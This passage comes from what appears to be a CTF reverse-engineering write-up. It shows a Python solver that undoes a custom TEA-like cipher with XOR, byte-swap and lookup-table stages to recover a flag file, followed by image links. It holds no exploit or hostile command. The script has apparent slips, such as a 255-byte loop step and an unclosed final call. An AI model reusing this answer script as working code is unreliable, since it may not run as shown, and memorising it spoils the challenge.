    0x3e, 0xa8, 0xb8, 0x66, 0xcc, 0x24, 0xde, 0x3b, 0x72, 0xdf, 0xf1, 0xd3, 0x9e, 0xbb, 0xea, 0x10, 0x59, 0x83, 0x1e,0xe6, 0x58, 0x26, 0xd8, 0xa3, 0xb5, 0x44, 0x42, 0xf6, 0xd2, 0xe3, 0x7c, 0x6e, 0x91, 0x40, 0x22, 0x9d, 0x4e, 0x9f,0x1b, 0xc8, 0x7b, 0x17, 0xf3, 0x03, 0xf0, 0xa4, 0xb3, 0xad, 0x0f, 0x96, 0xae, 0xef, 0x2e, 0x52, 0x16, 0x47, 0x13,0x20, 0xe5, 0x79, 0xdc, 0x92, 0x3a, 0xfd, 0xfc, 0x4b, 0x50, 0x2f, 0xb9, 0xcf, 0x15, 0x98, 0xf8, 0xba, 0x01, 0x7d,0x6f, 0x8f, 0x39, 0xd0, 0x7f, 0x99, 0xfe, 0x77, 0x81, 0x48, 0xd9, 0x11, 0xa0, 0x89, 0xe7, 0xdd, 0x04, 0x43, 0xa2,0x4d, 0x08, 0x5f, 0x71, 0x09, 0xd1, 0x02, 0xf4, 0xab, 0x8e, 0xa5, 0x07, 0x3f, 0x6c, 0x4f, 0x27, 0xe0, 0x1f, 0xbd,0x23, 0xc4, 0x1c, 0x0e, 0x80, 0x65, 0x74, 0xeb, 0x54, 0x64, 0xfb, 0xd4, 0x2d, 0x56, 0xc0, 0xc6, 0xee, 0xec, 0x55,0x87, 0x9c, 0x5a, 0xb4, 0xb7, 0x67, 0x90, 0x82, 0x6a, 0xa7, 0x29, 0x06, 0xe8, 0x88, 0x2a, 0x94, 0x35, 0x6b, 0x0d,0x0c, 0xc9, 0xda, 0x2c, 0x5c, 0xc3, 0x21, 0xbc, 0x41, 0x25, 0x97, 0xbe, 0x62, 0x73, 0x8c, 0xd6, 0x05, 0xbf, 0xaa,0xe9, 0xf7, 0x93, 0x3c, 0x78, 0xc2, 0x4a, 0xb2, 0x12, 0xa1, 0x75, 0xf2, 0xe1, 0xd5, 0x30, 0x3d, 0x9b, 0x53, 0xce,0x60, 0x8b, 0x8d, 0xa9, 0x36, 0x9a, 0x19, 0xb0, 0xff, 0xb6, 0xf5, 0x57, 0xb1, 0xc7, 0x38, 0x61, 0x85, 0xe2, 0xca,0x34, 0x33, 0xdb, 0x32, 0x7e, 0x2b, 0x7a, 0xfa, 0x69, 0xed, 0x1a, 0xcd, 0x70, 0x63, 0x86, 0x84, 0x0b, 0x00, 0x5e,0x76, 0xaf, 0x45, 0x46, 0xcb, 0x68, 0x49, 0x14, 0x5b, 0xf9, 0xe4, 0x4c, 0xc1, 0x95, 0x31, 0xd7, 0x51, 0x0a, 0xc5,0x28, 0x37, 0x5d, 0xac, 0x18, 0x1d, 0x8a, 0x6d, 0xa6
]
def cuda_decrypt(enc):
    enc = bytearray(enc)

    for i in range(256):
        enc[i] ^= i

    for i in range(0, 256, 8):
        t0 = struct.unpack('<I', enc[i:i+4])[0]
        t1 = struct.unpack('<I', enc[i+4:i+8])[0]

        temp = [-239350328, 387276957, 2027808484, -626627285, 1013904242, -1640531527]
        key = [0] * 6
        for j in range(6):
            key[j] = temp[j] + (-239350328 * 0x140000)

        for j in range(0, 10485760, 8):
            for k in range(6):
                key[k] = (key[k] + 239350328) & 0xFFFFFFFF

            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0] + 1640531527))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] + 1640531527 + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[0] - 1013904242))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[0] - 1013904242 + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[1]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[1] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[2]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[2] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[3]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[3] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[4]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[4] + t1))) & 0xFFFFFFFF
            
            t1 = (t1 - (((t0 << 4) + 1013904242) ^ ((t0 >> 5) + 338241895) ^ (t0 + key[5]))) & 0xFFFFFFFF
            t0 = (t0 - (((t1 << 4) + -1556008596) ^ ((t1 >> 5) + -939442524) ^ (key[5] + t1))) & 0xFFFFFFFF

        enc[i:i+4] = struct.pack('<I', t0)
        enc[i+4:i+8] = struct.pack('<I', t1)

    for i in range(0, 256, 2):
        data = enc[i]
        enc[i] = enc[(i - 1 + 256) % 256]
        enc[(i - 1 + 256) % 256] = data

    for i in range(0, 256, 2):
        data = enc[i]
        enc[i] = enc[(i + 1 + 256) % 256]
        enc[(i + 1) % 256] = data

    for i in range(255, -1, -1):
        enc[i] ^= 172 ^ enc[(i + 1) % 256]

    for i in range(256):
        data = RT[enc[i]]
        data = ((data >> 4) | (data << 4)) & 0xFF
        data ^= (i * 73 + 172) & 0xFF
        enc[i] = data

    return bytes(enc)

def main():

    with open("flag_enc", "rb") as f:
        content = bytearray(f.read())
    
    size = len(content)
    for i in range(0, size, 255): 
        block = content[i:i+256]
        if len(block) < 256:  
            block += bytearray(256 - len(block))
        decrypted_block = cuda_decrypt(block)
        content[i:i+256] = decrypted_block

    with open("flag", "wb") as f:
        f.write(content)

if __name__ == "__main__":
    main(
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/7-1740495999.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/0-1740495999.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/10-1740496000.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/6-1740496001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/2-1740496002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/4-1740496002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/8-1740496003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/2-1740496003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/0-1740496004.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/4-1740496005.png)